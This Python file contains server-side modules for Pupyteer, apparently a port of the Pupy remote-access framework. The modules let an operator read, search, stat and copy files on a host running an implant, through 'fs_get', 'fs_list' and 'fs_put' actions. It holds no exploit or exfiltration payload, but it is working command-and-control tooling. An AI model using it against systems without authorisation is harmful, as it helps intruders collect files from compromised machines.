"""File-management modules ported from upstream Pupy.

Upstream Pupy (https://github.com/n1nj4sec/pupy) ships a family of file modules
that Pupyteer did not carry over: ``cat``, ``ls``, ``stat``, ``cp``, ``mv``,
``rm``, ``mkdir``, ``edit``, ``search``. This module is the landing place for
that family.

Ported so far:

    cat     — read a remote file as text        (upstream pupy/modules/cat.py)
    search  — recursive filename search         (upstream pupy/modules/search.py,
                                                 isearch.py)
    stat    — metadata for one remote path      (upstream pupy/modules/stat.py)

``cat`` needs no agent change: the implant already declares ``fs_get``, so this
is a server-side wrapper that turns the agent's base64 blob into text an
operator can read in the result view.
"""
from __future__ import annotations

import base64
import binascii
import os
import tempfile
from collections import deque
from typing import Any, Dict, List

from pupyteer.server.modules.registry import PupyModule, ModuleCategory
from pupyteer.server.sessions import transfer
from pupyteer.server.modules.builtin.recon import _command_timeout, _no_agent


class CatModule(PupyModule):
    """Read a remote file and return its contents as text.

    Upstream Pupy's ``cat`` prints a file to the operator's terminal. The agent
    returns bytes base64-encoded, so the work here is decoding and refusing to
    present garbage as content.
    """

    name = "cat"
    version = "1.0.0"
    description = "Read a remote file and return its contents as text"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        path = str(args.get("path", "")).strip()
        if not path:
            return {"status": "error", "error": "path is required"}

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "fs_get", "path": path},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"], "path": path}

        encoded = reply.get("data", "")
        try:
            raw = base64.b64decode(encoded, validate=True)
        except (binascii.Error, TypeError, ValueError) as exc:
            return {
                "status": "error",
                "error": f"agent sent data that is not base64: {exc}",
                "path": path,
            }

        return {
            "status": "ok",
            "path": path,
            "content": raw.decode("utf-8", "replace"),
            "bytes": len(raw),
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        if not str(args.get("path", "")).strip():
            return ["Missing required argument: path"]
        return []


def _join(parent: str, name: str) -> str:
    """Join a remote path and a child name using the parent's own separator.

    The agent may be on Windows while this server runs on Linux, so the child
    separator is inferred from the parent rather than from the local os.
    """
    if parent.endswith(("/", "\\")):
        return parent + name
    sep = "\\" if "\\" in parent else "/"
    return f"{parent}{sep}{name}"


class SearchModule(PupyModule):
    """Recursively search a remote tree for filenames matching a pattern.

    Upstream Pupy's ``search``/``isearch``. The agent answers ``fs_list`` for one
    directory at a time, so the recursion is server-side orchestration: a
    breadth-first walk bounded by ``max_depth``.

    A directory the agent cannot read is recorded in ``errors`` rather than
    silently dropped — an operator searching for a file needs to know which parts
    of the tree were never examined, or "no matches" reads as "not there".
    """

    name = "search"
    version = "1.0.0"
    description = "Recursively search a remote tree for filenames matching a pattern"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    DEFAULT_MAX_DEPTH = 3

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        pattern = str(args.get("pattern", "")).strip()
        if not pattern:
            return {"status": "error", "error": "pattern is required"}

        root = str(args.get("path", "")).strip() or "."
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        try:
            max_depth = int(args.get("max_depth", self.DEFAULT_MAX_DEPTH))
        except (TypeError, ValueError):
            max_depth = self.DEFAULT_MAX_DEPTH
        if max_depth < 0:
            max_depth = 0

        timeout = _command_timeout(args)
        needle = pattern.lower()
        matches: List[Dict[str, Any]] = []
        errors: List[str] = []
        dirs_visited = 0

        queue: deque = deque([(root, 0)])
        while queue:
            current, depth = queue.popleft()
            reply = await transfer.run_action(
                session_mgr, session.session_id,
                {"action": "fs_list", "path": current}, timeout=timeout)

            if reply.get("error"):
                errors.append(f"{current}: {reply['error']}")
                continue
            entries = reply.get("entries")
            if not isinstance(entries, list):
                errors.append(f"{current}: agent sent no listing")
                continue
            dirs_visited += 1

            for entry in entries:
                if not isinstance(entry, dict):
                    continue
                name = str(entry.get("name", ""))
                if needle in name.lower():
                    matches.append({
                        "path": _join(current, name),
                        "name": name,
                        "is_file": bool(entry.get("is_file")),
                        "is_dir": bool(entry.get("is_dir")),
                        "size": entry.get("size"),
                        "mtime": entry.get("mtime"),
                    })
                if entry.get("is_dir") and depth < max_depth:
                    queue.append((_join(current, name), depth + 1))

        return {
            "status": "ok",
            "path": root,
            "pattern": pattern,
            "matches": matches,
            "dirs_visited": dirs_visited,
            "errors": errors,
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        if not str(args.get("pattern", "")).strip():
            return ["Missing required argument: pattern"]
        return []


class StatModule(PupyModule):
    """Report metadata for a single remote path.

    Upstream Pupy's ``stat``. The implant declares no ``stat`` action, but it
    does answer ``fs_list`` for a directory, so this is derivable server-side:
    list the parent and pick out the named entry.

    That keeps it out of the agent contract entirely — no new action, no
    ``CAPABILITIES`` change, and no risk of the two agents drifting apart. It
    costs one directory listing, which is the right trade for an action that
    would otherwise have to be implemented twice (Python and C).
    """

    name = "stat"
    version = "1.0.0"
    description = "Report metadata for a single remote path"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        path = str(args.get("path", "")).strip()
        if not path:
            return {"status": "error", "error": "path is required"}

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        # Split on the path's own separator: the target may be Windows while
        # this server runs on Linux.
        sep = "\\" if "\\" in path else "/"
        trimmed = path.rstrip("/\\")
        parent, _, name = trimmed.rpartition(sep)
        if not parent:
            parent = sep
        if not name:
            return {"status": "error", "error": f"cannot stat {path}", "path": path}

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "fs_list", "path": parent},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"], "path": path}

        entries = reply.get("entries")
        if not isinstance(entries, list):
            return {
                "status": "error",
                "error": f"agent sent no listing for {parent}",
                "path": path,
            }

        for entry in entries:
            if isinstance(entry, dict) and str(entry.get("name", "")) == name:
                return {
                    "status": "ok",
                    "path": path,
                    "name": name,
                    "is_file": bool(entry.get("is_file")),
                    "is_dir": bool(entry.get("is_dir")),
                    "size": entry.get("size"),
                    "mtime": entry.get("mtime"),
                }

        return {
            "status": "error",
            "error": f"{name} is not in the listing for {parent}",
            "path": path,
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        if not str(args.get("path", "")).strip():
            return ["Missing required argument: path"]
        return []


class CpModule(PupyModule):
    """Copy a file on the target, remote to remote.

    Upstream Pupy's ``cp``. Server-side, like ``stat``: the implant already
    declares ``fs_get`` and ``fs_put``, so this is pull-to-temp then push. No
    agent action, no capability change, and nothing to keep in sync across the
    two agents.

    It goes through ``transfer.pull``/``push`` rather than raw ``fs_get``/
    ``fs_put`` deliberately: those size each chunk against the agent's declared
    ``max_line`` and the line-framing allowance, so a file bigger than the
    agent's read buffer copies correctly instead of being silently truncated --
    which is the one failure mode an operator would not notice.

    A failed read aborts before anything is written, so a partial copy never
    lands on the destination looking like a complete one.
    """

    name = "cp"
    version = "1.0.0"
    description = "Copy a file on the target (remote to remote)"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        src = str(args.get("src", "")).strip()
        dst = str(args.get("dst", "")).strip()
        if not src or not dst:
            return {"status": "error", "error": "both src and dst are required"}

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        timeout = _command_timeout(args)
        fd, staged = tempfile.mkstemp(prefix="pupyteer-cp-", suffix=".bin")
        try:
            with os.fdopen(fd, "wb") as sink:
                pulled = await transfer.pull(
                    session_mgr, session.session_id, src, sink, timeout=timeout)
            if pulled.get("error") or pulled.get("status") == "error":
                return {
                    "status": "error",
                    "error": pulled.get("error", "the read failed"),
                    "src": src,
                }

            pushed = await transfer.push(
                session_mgr, session.session_id, staged, dst, timeout=timeout)
            if pushed.get("error") or pushed.get("status") == "error":
                return {
                    "status": "error",
                    "error": pushed.get("error", "the write failed"),
                    "dst": dst,
                }

            return {
                "status": "ok",
                "src": src,
                "dst": dst,
                "bytes_read": pulled.get("bytes"),
                "bytes_written": pushed.get("bytes"),
            }
        finally:
            try:
                os.unlink(staged)
            except OSError:
                pass

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        missing = [k for k in ("src", "dst") if not str(args.get(k, "")).strip()]
        return [f"Missing required argument: {m}" for m in missing]
